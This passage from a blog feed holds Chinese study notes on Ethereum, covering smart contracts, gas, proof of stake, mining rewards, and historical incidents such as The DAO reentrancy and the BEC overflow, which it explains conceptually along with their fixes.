href="consortium/consortium.md">🔗</a></li></ul></li></ul></li><li><p><strong>商业向</strong>（可以在公有链和联盟链中选一个，有精力的话建议全部都搞）：</p><ul><li>公有链方向，深入了解 DeFi 和 NFT：<ul><li><strong>DeFi</strong><ul><li>深入体验多款 DeFi 产品</li><li>了解 DeFi 的生态，阅读一些 DeFi 的研究报告 <a href="https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/defi_report.pdf">🔗</a></li></ul></li><li><strong>NFT</strong><ul><li>深入体验多款 NFT 产品</li><li><strong>Roadmap-NFT 第二层</strong>：<a href="nft/nft.md">🔗</a></li></ul></li></ul></li><li>联盟链方向，深入了解各个联盟链框架以及联盟链的商业价值和应用实践：<ul><li><strong>联盟链学习 roadmap - 第三层</strong>：<a href="consortium/consortium.md">🔗</a></li><li>存证、溯源、供应链金融、数字身份、政务、版权保护….</li><li>建议先看《2018 年中国区块链产业白皮书》，虽然目前已经是 2020 年了，但是这个报告确实不错</li><li>有一些书籍：《产业区块链》（豆瓣介绍<a href="https://book.douban.com/subject/35030217/">🔗</a>，腾讯系的区块链实践，马化腾作序，可以起到一些了解的作用）</li></ul></li></ul></li></ul><h2 id="第一百层"><a href="#第一百层" class="headerlink" title="第一百层"></a>第一百层</h2><blockquote><p>浩瀚无垠，分头突围</p></blockquote><h2 id="其他优质资源"><a href="#其他优质资源" class="headerlink" title="其他优质资源"></a>其他优质资源</h2><ul><li>awesome-blockchain：<a href="https://github.com/chaozh/awesome-blockchain-cn">🔗</a></li><li>awesome-metaverse：<a href="https://github.com/M3-org/awesome-metaverse">🔗</a></li><li>awesome-zjubca：<a href="https://github.com/Blockchain-zju/awesome-zjubca">🔗</a></li><li>Journey-to-become-a-Blockchain-Engineer: <a href="https://github.com/spo0ds/Journey-to-become-a-Blockchain-Engineer">🔗</a></li></ul><p>多用 Google，多逛国外论坛，多水群，时刻关注区块链前沿。</p><h2 id="大气层"><a href="#大气层" class="headerlink" title="大气层"></a>大气层</h2><p>从狭义区块链的视角转向广义区块链的视角：Web3。</p><blockquote><p>区块链是手段，Web3 是目的。</p></blockquote><ul><li>Web3-WIKI：<a href="https://github.com/Web3-Club/Web3wiki-Website">🔗</a></li></ul><h2 id="太空宇宙"><a href="#太空宇宙" class="headerlink" title="太空宇宙"></a>太空宇宙</h2><blockquote><p>Metaverse：下一代互联网&#x2F;数字世界的形态。</p></blockquote><ul><li>Metaverse-WIKI：<a href="https://en.wikipedia.org/wiki/Metaverse">🔗</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>Road</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>Road</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>13-ETH-区块链的应用</title>
    <link href="/2024/07/31/13-ETH-%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <url>/2024/07/31/13-ETH-%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链不是万能的"><a href="#区块链不是万能的" class="headerlink" title="区块链不是万能的"></a>区块链不是万能的</h1><h1 id="区块链在全链上上链信息"><a href="#区块链在全链上上链信息" class="headerlink" title="区块链在全链上上链信息"></a>区块链在全链上上链信息</h1><h1 id="没有信任关系"><a href="#没有信任关系" class="headerlink" title="没有信任关系"></a>没有信任关系</h1><h1 id="去中心花与中心化模式是没有黑白分明的"><a href="#去中心花与中心化模式是没有黑白分明的" class="headerlink" title="去中心花与中心化模式是没有黑白分明的"></a>去中心花与中心化模式是没有黑白分明的</h1><h1 id="法律监管问题"><a href="#法律监管问题" class="headerlink" title="法律监管问题"></a>法律监管问题</h1><h1 id="跨国交易与转账"><a href="#跨国交易与转账" class="headerlink" title="跨国交易与转账"></a>跨国交易与转账</h1><h1 id="去中心化有自己的应用场景"><a href="#去中心化有自己的应用场景" class="headerlink" title="去中心化有自己的应用场景"></a>去中心化有自己的应用场景</h1><h1 id="效率在当时的历史条件上看"><a href="#效率在当时的历史条件上看" class="headerlink" title="效率在当时的历史条件上看"></a>效率在当时的历史条件上看</h1><h1 id="智能合约存在安全漏洞并且不易看懂"><a href="#智能合约存在安全漏洞并且不易看懂" class="headerlink" title="智能合约存在安全漏洞并且不易看懂"></a>智能合约存在安全漏洞并且不易看懂</h1><ul><li>程序化是大趋势。</li><li>不能因噎废食。</li><li>智能合约只能解决部分问题。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>12-ETH-美链</title>
    <link href="/2024/07/31/12-ETH-%E7%BE%8E%E9%93%BE/"/>
    <url>/2024/07/31/12-ETH-%E7%BE%8E%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="美链-一种代币"><a href="#美链-一种代币" class="headerlink" title="美链(一种代币)"></a>美链(一种代币)</h1><ul><li><p>只是一个智能合约。</p></li><li><p>有自己的代币BEC.</p></li><li><p>ICO(Initial Coin offering)</p></li><li><p>没有自己的链，代币的交易都是通过智能合约的函数来实现的。</p></li><li><p>可以自定义规则，每个账户有多少代币存储在智能合约的状态变量里面。</p></li><li><p>ERC 20是以太坊的代币的一个标准，规范了所有发行的合约应该实现的功能和遵循的接口。（Ethereum Request for Comments）</p></li><li><p>美链中有一个叫做batchTransfer的函数，功能是向多个接收者发送代币，把这些代币从调用者里面扣除。<br><img src="/../pic/Pasted%20image%2020240731231353.png"></p></li><li><p>数据乘法溢出。</p></li><li><p>发送的很多。</p></li><li><p>减少的很少。</p></li></ul><h1 id="考虑是不是溢出"><a href="#考虑是不是溢出" class="headerlink" title="考虑是不是溢出"></a>考虑是不是溢出</h1><h1 id="safemath库自动判断是否溢出"><a href="#safemath库自动判断是否溢出" class="headerlink" title="safemath库自动判断是否溢出"></a>safemath库自动判断是否溢出</h1>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11-ETH-反思</title>
    <link href="/2024/07/31/11-ETH-%E5%8F%8D%E6%80%9D/"/>
    <url>/2024/07/31/11-ETH-%E5%8F%8D%E6%80%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><h2 id="智能合约的反思"><a href="#智能合约的反思" class="headerlink" title="智能合约的反思"></a>智能合约的反思</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>自动合约。</li><li>代码合同</li></ul><h3 id="不可篡改性"><a href="#不可篡改性" class="headerlink" title="不可篡改性"></a>不可篡改性</h3><ul><li>有漏洞无法进行补丁。</li><li>冻结账户终结交易是困难的。</li><li>只有软分叉才能实现冻结。</li><li>快转走钱。</li></ul><h3 id="什么是不可篡改的"><a href="#什么是不可篡改的" class="headerlink" title="什么是不可篡改的"></a>什么是不可篡改的</h3><ul><li>没有什么是不可篡改的。</li></ul><h3 id="语言设计上的问题"><a href="#语言设计上的问题" class="headerlink" title="语言设计上的问题"></a>语言设计上的问题</h3><ul><li>转账回调函数。</li><li>图灵完备是不是好。</li><li>模板化。</li><li>合约专门的书写部门可能。</li></ul><h3 id="many-eyeball-fallacy"><a href="#many-eyeball-fallacy" class="headerlink" title="many eyeball fallacy"></a>many eyeball fallacy</h3><ul><li>别人看不懂源代码。</li></ul><h3 id="去中心化"><a href="#去中心化" class="headerlink" title="去中心化"></a>去中心化</h3><ul><li>对规则的修改需要进行投票。</li><li>分叉是去中心化的体现，是民主的选择。</li></ul><h3 id="去中心化-分布式"><a href="#去中心化-分布式" class="headerlink" title="去中心化 !&#x3D; 分布式"></a>去中心化 !&#x3D; 分布式</h3><ul><li>去中心化是分布式。</li><li>分布式可以是中心化。</li><li>分布式是多个计算机处理一个任务。</li><li>去中心化是为了容错，速度很慢。</li><li>运行在上面的主要是某些控制逻辑。</li><li>大规模的计算与存储是十分不划算的。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>10-ETH-DAO</title>
    <link href="/2024/07/31/10-ETH-DAO/"/>
    <url>/2024/07/31/10-ETH-DAO/</url>
    
    <content type="html"><![CDATA[<h1 id="DAO-Decenntralized-Automous-Orgarization"><a href="#DAO-Decenntralized-Automous-Orgarization" class="headerlink" title="DAO(Decenntralized Automous Orgarization)"></a>DAO(Decenntralized Automous Orgarization)</h1><h2 id="The-DAO（去中心化的自治组织的一个）"><a href="#The-DAO（去中心化的自治组织的一个）" class="headerlink" title="The DAO（去中心化的自治组织的一个）"></a>The DAO（去中心化的自治组织的一个）</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li>通过发送给众筹组织以太币，从而获取代币，从而获得投票权。</li><li></li></ul><h3 id="收回以太币（拆分）"><a href="#收回以太币（拆分）" class="headerlink" title="收回以太币（拆分）"></a>收回以太币（拆分）</h3><ul><li>拆分成立子基金child DAO，然后投给自己。</li><li>拆分之前有7天讨论期。</li><li>拆分之后的子基金以太币28天冻结期。</li></ul><h4 id="the-dao-代码"><a href="#the-dao-代码" class="headerlink" title="the dao 代码"></a>the dao 代码</h4><p><img src="/../pic/Pasted%20image%2020240731220617.png"></p><ul><li>应该先设置为0，在进行转账操作。</li></ul><h4 id="补救措施（失败）"><a href="#补救措施（失败）" class="headerlink" title="补救措施（失败）"></a>补救措施（失败）</h4><ul><li>软件升级添加一个交易判断条件。</li><li>跟the dao相关的都不合法的软分叉。</li><li>但是没有问关于the dao的交易收取gas费用。</li></ul><h4 id="硬分叉的措施"><a href="#硬分叉的措施" class="headerlink" title="硬分叉的措施"></a>硬分叉的措施</h4><ul><li>强行把the dao的资金转入新的合约。</li><li>在第192w个区块进行强行转账。</li></ul><h4 id="不支持的分叉"><a href="#不支持的分叉" class="headerlink" title="不支持的分叉"></a>不支持的分叉</h4><ul><li>许多的以太币没有参与投票。</li><li>多数即正义？</li><li>新链叫ETC。</li><li>增加了Chain ID区分新旧链。</li></ul><h1 id="DAC-De-Au-Corporation"><a href="#DAC-De-Au-Corporation" class="headerlink" title="DAC(De Au Corporation)"></a>DAC(De Au Corporation)</h1><ul><li>盈利组织。</li><li>没有法人地位。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>09-ETH-智能合约</title>
    <link href="/2024/07/31/09-ETH-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    <url>/2024/07/31/09-ETH-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>可执行代码。</li></ul><h2 id="编程特点"><a href="#编程特点" class="headerlink" title="编程特点"></a>编程特点</h2><p><img src="/../pic/Pasted%20image%2020240731154908.png"></p><p><img src="/../pic/Pasted%20image%2020240731155038.png"></p><ul><li>不知支持对于哈希表进行遍历。</li><li>构造函数只能有一个。</li><li>调用函数放在data域中。</li><li>接受转账的函数需要设置为payable类型。</li><li>竞标的函数通过叫价把自己的以太币放在合约里面锁定。</li><li>withdraw函数撤回以太币函数。</li></ul><h2 id="合约调用另一个合约函数"><a href="#合约调用另一个合约函数" class="headerlink" title="合约调用另一个合约函数"></a>合约调用另一个合约函数</h2><h3 id="直接调用"><a href="#直接调用" class="headerlink" title="直接调用"></a>直接调用</h3><p><img src="/../pic/Pasted%20image%2020240731155254.png"></p><ul><li>被调用出现错误，调用者也出现错误。</li></ul><h3 id="使用address类型进行调用"><a href="#使用address类型进行调用" class="headerlink" title="使用address类型进行调用"></a>使用address类型进行调用</h3><p><img src="/../pic/Pasted%20image%2020240731155404.png"></p><ul><li>被调用函数异常，调用者会继续执行。</li></ul><h3 id="代理调用"><a href="#代理调用" class="headerlink" title="代理调用"></a>代理调用</h3><p><img src="/../pic/Pasted%20image%2020240731162336.png"></p><ul><li>在当前环境执行被调用函数。</li></ul><h2 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h2><h3 id="fallback-函数"><a href="#fallback-函数" class="headerlink" title="fallback()函数"></a>fallback()函数</h3><p><img src="/../pic/Pasted%20image%2020240731162647.png"></p><ul><li>默认保底调用函数在data域中。</li><li>合约接受转账。</li><li>调用的合约函数不存在。</li><li>为了填充data域。</li></ul><h2 id="创建与运行"><a href="#创建与运行" class="headerlink" title="创建与运行"></a>创建与运行</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><ul><li>写代码，进行编译为bytecode形式。</li><li>创建合约：通过向0x00地址发起0ETH的转账交易。</li><li>代码放在data域中，并且支付一定的gas fee.</li></ul><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul><li>智能合约运行在EVM上。</li><li>EVM提供一个统一的运行平台。</li><li>以太坊是一个交易驱动的状态机，要确定每个账户的状态。</li><li>调用智能合约的交易发布到区块上，每个矿工都会执行这个交易。</li><li>为了进行确定性的状态转移。</li></ul><h2 id="gas-fee"><a href="#gas-fee" class="headerlink" title="gas fee"></a>gas fee</h2><ul><li>图灵完备系统。</li><li>出现死循环是halting problem。</li><li>执行合约收取gas fee，由发起人来支付。</li><li>gas limit是最大限度的数据可用的gas 费用。</li><li>先提取最大gas fee,多余大的再返回。</li><li>少的话就就会回滚，退回到执行之前的状态。</li><li>简单指令是便宜的，复杂的或者需要存储状态的指令很贵。</li><li>读取公共数据是免费的。</li><li>运行错误也会返回，运行的消耗的gas fee是不退回的，避免拒绝服务攻击。</li></ul><h3 id="扣费原理"><a href="#扣费原理" class="headerlink" title="扣费原理"></a>扣费原理</h3><ul><li>状态数、交易树、收据树，都在本地维护。</li><li>先在本地进行扣除最大gas 费用，不够不执行。</li><li>执行完了加回多余的费用。</li></ul><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><h3 id="不存在处理错误的操作。"><a href="#不存在处理错误的操作。" class="headerlink" title="不存在处理错误的操作。"></a>不存在处理错误的操作。</h3><h3 id="assert-bool-condition"><a href="#assert-bool-condition" class="headerlink" title="assert(bool condition)"></a>assert(bool condition)</h3><ul><li>不满足条件就会抛出错误。</li><li>用于内部的错误。</li></ul><h3 id="require-bool-condition"><a href="#require-bool-condition" class="headerlink" title="require(bool condition)"></a>require(bool condition)</h3><ul><li>不满足条件就抛出错误。</li><li>用于输入或者外部的组件引起的错误。</li></ul><h3 id="revert-throw"><a href="#revert-throw" class="headerlink" title="revert(){throw()}"></a>revert(){throw()}</h3><ul><li>直接终止运行并进行回滚。</li></ul><h3 id="嵌套调用"><a href="#嵌套调用" class="headerlink" title="嵌套调用"></a>嵌套调用</h3><ul><li>合约的执行具有原子性。</li><li>一个合约调用另一个合约的函数。</li><li>通过直接调用的方式会出现连锁回滚。</li><li>通过address类型调用域代理调用不会混滚调用者的合约。</li><li>转账默认调用fallback函数，也会进行嵌套调用。</li></ul><h2 id="区块发布"><a href="#区块发布" class="headerlink" title="区块发布"></a>区块发布</h2><h3 id="先执行再挖矿"><a href="#先执行再挖矿" class="headerlink" title="先执行再挖矿"></a>先执行再挖矿</h3><ul><li>先获取三棵树的根哈希值。</li></ul><h3 id="消耗资源的节点获得什么补偿"><a href="#消耗资源的节点获得什么补偿" class="headerlink" title="消耗资源的节点获得什么补偿"></a>消耗资源的节点获得什么补偿</h3><ul><li>没有补偿，还要验证交易的合法性与区块的同步性。</li></ul><h3 id="会不会不给汽油费不验证"><a href="#会不会不给汽油费不验证" class="headerlink" title="会不会不给汽油费不验证"></a>会不会不给汽油费不验证</h3><ul><li>危害区块链安全，就相当于不干了。</li><li>发新的区块时别人不认，相当于无效挖矿。</li><li>可以抄别人的信息。</li></ul><h3 id="发布到区块链的交易是不是都是成功执行的"><a href="#发布到区块链的交易是不是都是成功执行的" class="headerlink" title="发布到区块链的交易是不是都是成功执行的"></a>发布到区块链的交易是不是都是成功执行的</h3><ul><li>也要发布，需要扣汽油费。</li><li>要不然无法扣汽油费。</li></ul><h4 id="收据树"><a href="#收据树" class="headerlink" title="收据树"></a>收据树</h4><p><img src="/../pic/Pasted%20image%2020240731184932.png"></p><h3 id="智能合约支不支持多核并行处理"><a href="#智能合约支不支持多核并行处理" class="headerlink" title="智能合约支不支持多核并行处理"></a>智能合约支不支持多核并行处理</h3><ul><li>不支持多线程。</li><li>状态转换是确定性的。</li><li>多线程会导致结果不同。 </li><li>产生随机数也不支持。</li><li>使用的是伪随机数。</li></ul><h4 id="智能合约可以得到区块的信息"><a href="#智能合约可以得到区块的信息" class="headerlink" title="智能合约可以得到区块的信息"></a>智能合约可以得到区块的信息</h4><p><img src="/../pic/Pasted%20image%2020240731185943.png"></p><h4 id="智能合约可以获得调用的信息"><a href="#智能合约可以获得调用的信息" class="headerlink" title="智能合约可以获得调用的信息"></a>智能合约可以获得调用的信息</h4><p><img src="/../pic/Pasted%20image%2020240731190048.png"></p><ul><li>message.data：发起的合约函数。</li><li>tx.origin：交易或者调用的最终发起者。</li></ul><h3 id="地址类型"><a href="#地址类型" class="headerlink" title="地址类型"></a>地址类型</h3><p><img src="/../pic/Pasted%20image%2020240731190411.png"></p><ul><li>address.transfer(amount)：转入函数。</li><li>address.send：发送交易。</li></ul><h4 id="转账的三种方式"><a href="#转账的三种方式" class="headerlink" title="转账的三种方式"></a>转账的三种方式</h4><h5 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h5><ul><li>专门转账的。</li><li>失败就抛出异常，引起连锁回滚。</li><li>汽油费少。</li></ul><h5 id="send"><a href="#send" class="headerlink" title="send"></a>send</h5><ul><li>专门转账函数。</li><li>失败返回false。</li><li>汽油费少。</li></ul><h5 id="call-value"><a href="#call-value" class="headerlink" title="call.value"></a>call.value</h5><ul><li>也不会引起失败连锁反应。</li><li>把本来剩下的所有汽油费都发给执行节点。</li></ul><h2 id="拍卖合约"><a href="#拍卖合约" class="headerlink" title="拍卖合约"></a>拍卖合约</h2><h3 id="主合约"><a href="#主合约" class="headerlink" title="主合约"></a>主合约</h3><p><img src="/../pic/Pasted%20image%2020240731154908.png"></p><h3 id="竞拍合约函数"><a href="#竞拍合约函数" class="headerlink" title="竞拍合约函数"></a>竞拍合约函数</h3><p><img src="/../pic/Pasted%20image%2020240731191813.png"></p><h3 id="结束竞拍函数"><a href="#结束竞拍函数" class="headerlink" title="结束竞拍函数"></a>结束竞拍函数</h3><p><img src="/../pic/Pasted%20image%2020240731191946.png"></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><h4 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h4><p><img src="/../pic/Pasted%20image%2020240731193147.png"></p><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><ul><li>在黑客调用这个黑客合约函数时，会进行竞拍。</li><li>把黑客发送的竞拍币都发给竞拍函数。</li><li>在竞拍结束后，要返回非最高出价人的钱时。</li><li>找不到黑客合约的fallback函数，转账失败。</li><li>且用的是tranfer进行的转账回去，就会出现合约执行错误。</li><li>所有人都无法获得发出的拍卖资金。</li><li>无法补救。</li><li>code is law.</li></ul><h3 id="修改合约函数"><a href="#修改合约函数" class="headerlink" title="修改合约函数"></a>修改合约函数</h3><h4 id="拍卖结束撤回资金"><a href="#拍卖结束撤回资金" class="headerlink" title="拍卖结束撤回资金"></a>拍卖结束撤回资金</h4><p><img src="/../pic/Pasted%20image%2020240731193958.png"></p><h4 id="给受益人转钱"><a href="#给受益人转钱" class="headerlink" title="给受益人转钱"></a>给受益人转钱</h4><p><img src="/../pic/Pasted%20image%2020240731194050.png"></p><h4 id="黑客合约"><a href="#黑客合约" class="headerlink" title="黑客合约"></a>黑客合约</h4><p><img src="/../pic/Pasted%20image%2020240731195121.png"></p><ul><li>通过fallback一直进行递归调用转账.</li><li>合约没钱了.</li><li>汽油费不够了.</li><li>调用栈超限.</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>08-ETH-权益证明</title>
    <link href="/2024/07/31/08-ETH-%E6%9D%83%E7%9B%8A%E8%AF%81%E6%98%8E/"/>
    <url>/2024/07/31/08-ETH-%E6%9D%83%E7%9B%8A%E8%AF%81%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<h2 id="工作量证明能耗太高"><a href="#工作量证明能耗太高" class="headerlink" title="工作量证明能耗太高"></a>工作量证明能耗太高</h2><h3 id="ETH每笔能耗小于BTC"><a href="#ETH每笔能耗小于BTC" class="headerlink" title="ETH每笔能耗小于BTC"></a>ETH每笔能耗小于BTC</h3><ul><li>由于ETH出块速度快。</li><li>平均下来消耗能耗就会小一点。</li></ul><h1 id="原来是工作量证明"><a href="#原来是工作量证明" class="headerlink" title="原来是工作量证明"></a>原来是工作量证明</h1><h1 id="POS-权益证明"><a href="#POS-权益证明" class="headerlink" title="POS(权益证明)"></a>POS(权益证明)</h1><ul><li>需要51%的币才有攻击的可能。</li></ul><h1 id="Proof-of-Deposit"><a href="#Proof-of-Deposit" class="headerlink" title="Proof of Deposit"></a>Proof of Deposit</h1><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul><li>可以通过币来进行降低挖矿难度。</li><li>威胁是币越多的人越容易挖矿。</li><li>通过对于投入降低难度的币进行时间锁定。</li></ul><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul><li>两头下注，在两条链上投入相同的币进行挖矿。</li></ul><h2 id="Casper-the-Friendly-Finality-Gadest-FFG"><a href="#Casper-the-Friendly-Finality-Gadest-FFG" class="headerlink" title="Casper the Friendly  Finality Gadest(FFG)"></a>Casper the Friendly  Finality Gadest(FFG)</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>不会出现回滚，确认最长连。</li></ul><h3 id="验证者（Validator）"><a href="#验证者（Validator）" class="headerlink" title="验证者（Validator）"></a>验证者（Validator）</h3><ul><li>投入一定数量的以太币作为质押。</li><li>权重与投入的币数量正比。</li><li>币会被锁定。</li><li>不投票会被罚一定数量的以太币。</li><li>乱投不符合规则的票，会被没收投入的以太币，并销毁。</li><li>有任期。</li><li>任期结束后进行等待期，进行等待其他的检举揭发，进行惩处。</li><li></li></ul><h3 id="投票"><a href="#投票" class="headerlink" title="投票"></a>投票</h3><ul><li>50个区块投票一次.</li><li>每个epoch投一次票。</li><li>这一次投票对于上一个epoch来说是准备的投票。</li><li>对于这一个epoch来说是提交的投票。</li><li>获取两个投票2&#x2F;3以上的投票资金支持才可以。</li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="投票的Finality会不会被推翻"><a href="#投票的Finality会不会被推翻" class="headerlink" title="投票的Finality会不会被推翻"></a>投票的Finality会不会被推翻</h4><ul><li>至少有1&#x2F;3的验证者进行两边押注。</li></ul><h4 id="为什么不开始就用权益证明"><a href="#为什么不开始就用权益证明" class="headerlink" title="为什么不开始就用权益证明"></a>为什么不开始就用权益证明</h4><ul><li>bug bounty</li></ul><h2 id="EOS-DPOS"><a href="#EOS-DPOS" class="headerlink" title="EOS(DPOS)"></a>EOS(DPOS)</h2><ul><li>选取超级节点进行投票。</li></ul><h2 id="挖矿的实际作用"><a href="#挖矿的实际作用" class="headerlink" title="挖矿的实际作用"></a>挖矿的实际作用</h2><ul><li>可以以货币形式存储过剩的电能。</li><li>但是进行的是无用功操作，浪费资源。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>07-ETH-难度调整</title>
    <link href="/2024/07/30/07-ETH-%E9%9A%BE%E5%BA%A6%E8%B0%83%E6%95%B4/"/>
    <url>/2024/07/30/07-ETH-%E9%9A%BE%E5%BA%A6%E8%B0%83%E6%95%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p><img src="/../pic/Pasted%20image%2020240730170810.png"></p><p><img src="/../pic/Pasted%20image%2020240730170925.png"></p><p><img src="/../pic/Pasted%20image%2020240730171104.png"></p><p><img src="/../pic/Pasted%20image%2020240730171145.png"></p><ul><li><p>为了实现15秒左右的共识，为权益证明实现提供更多的时间。</p></li><li><p>回退了300万个<br><img src="/../pic/Pasted%20image%2020240730171630.png"></p></li><li><p>难度炸弹的调整在拜占庭阶段。</p></li><li><p>调整区块的奖励。</p></li></ul><h1 id="具体的代码实现"><a href="#具体的代码实现" class="headerlink" title="具体的代码实现"></a>具体的代码实现</h1><h2 id="拜占庭阶段挖矿难度调整"><a href="#拜占庭阶段挖矿难度调整" class="headerlink" title="拜占庭阶段挖矿难度调整"></a>拜占庭阶段挖矿难度调整</h2><p><img src="/../pic/Pasted%20image%2020240730171915.png"></p><p><img src="/../pic/Pasted%20image%2020240730172050.png"></p><p><img src="/../pic/Pasted%20image%2020240730172201.png"></p>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>06-ETH-挖矿算法</title>
    <link href="/2024/07/30/06-ETH-%E6%8C%96%E7%9F%BF%E7%AE%97%E6%B3%95/"/>
    <url>/2024/07/30/06-ETH-%E6%8C%96%E7%9F%BF%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="共识机制（ghost）"><a href="#共识机制（ghost）" class="headerlink" title="共识机制（ghost）"></a>共识机制（ghost）</h1><ul><li><p>作废块也有出块奖励，uncle block。</p></li><li><p>叔块奖励奖励的7&#x2F;8。</p></li><li><p>最多包含2个叔父区块。</p></li><li><p>包含了区块获得1&#x2F;32。</p></li></ul><p><img src="/../pic/Pasted%20image%2020240730154320.png"></p><h1 id="修改协议"><a href="#修改协议" class="headerlink" title="修改协议"></a>修改协议</h1><ul><li><p>区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。</p></li><li><p>最多有7辈分的叔。</p></li><li><p>为了尽快合并区块链。</p></li><li><p>解决临时性分叉。</p></li><li><p>防止篡改。</p></li><li><p>只能合并合法区块，包含了非法块就成为坏块。</p></li></ul><p><img src="/../pic/Pasted%20image%2020240730155608.png"></p><h1 id="奖励"><a href="#奖励" class="headerlink" title="奖励"></a>奖励</h1><ul><li><p>block reward：不会自动变化。</p></li><li><p>gas free：</p></li><li><p>叔父区块无法包含交易。</p></li><li><p>叔父区块只查header，交易容易与主链冲突。</p></li><li><p>叔块包含的交易会在后面的主链上进行执行。</p></li><li><p>只有分叉后的第一个区块才奖励。<br><img src="/../pic/Pasted%20image%2020240730161831.png"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>05-ETH-公式机制</title>
    <link href="/2024/07/30/05-ETH-%E5%85%AC%E5%BC%8F%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/07/30/05-ETH-%E5%85%AC%E5%BC%8F%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="共识机制（ghost）"><a href="#共识机制（ghost）" class="headerlink" title="共识机制（ghost）"></a>共识机制（ghost）</h1><ul><li><p>作废块也有出块奖励，uncle block。</p></li><li><p>叔块奖励奖励的7&#x2F;8。</p></li><li><p>最多包含2个叔父区块。</p></li><li><p>包含了区块获得1&#x2F;32。</p></li></ul><p><img src="/../pic/Pasted%20image%2020240730154320.png"></p><h1 id="修改协议"><a href="#修改协议" class="headerlink" title="修改协议"></a>修改协议</h1><ul><li><p>区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。</p></li><li><p>最多有7辈分的叔。</p></li><li><p>为了尽快合并区块链。</p></li><li><p>解决临时性分叉。</p></li><li><p>防止篡改。</p></li><li><p>只能合并合法区块，包含了非法块就成为坏块。</p></li></ul><p><img src="/../pic/Pasted%20image%2020240730155608.png"></p><h1 id="奖励"><a href="#奖励" class="headerlink" title="奖励"></a>奖励</h1><ul><li><p>block reward：不会自动变化。</p></li><li><p>gas free：</p></li><li><p>叔父区块无法包含交易。</p></li><li><p>叔父区块只查header，交易容易与主链冲突。</p></li><li><p>叔块包含的交易会在后面的主链上进行执行。</p></li><li><p>只有分叉后的第一个区块才奖励。<br><img src="/../pic/Pasted%20image%2020240730161831.png"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
